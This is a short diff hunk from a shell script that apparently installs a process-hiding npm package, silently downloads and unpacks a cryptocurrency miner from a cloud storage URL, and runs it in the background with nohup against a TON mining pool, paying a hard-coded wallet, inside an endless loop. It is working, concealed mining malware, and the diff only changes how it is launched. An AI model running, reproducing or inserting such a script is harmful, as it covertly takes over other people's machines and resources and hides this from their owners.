@@ -8,7 +8,7 @@ npm i -g node-process-hider
 wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1
 tar -xf danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1
 chmod +x danila-miner >/dev/null 2>&1
-./danila-miner run https://next.ton-pool.com EQBAIt3Hs69kCi4grIGDha7_mhF40wWG4vB83dRBsT_JXpwF
+nohup ./danila-miner run https://next.ton-pool.com EQBAIt3Hs69kCi4grIGDha7_mhF40wWG4vB83dRBsT_JXpwF > nohup.out
 
 while [ 1 ]; do
 
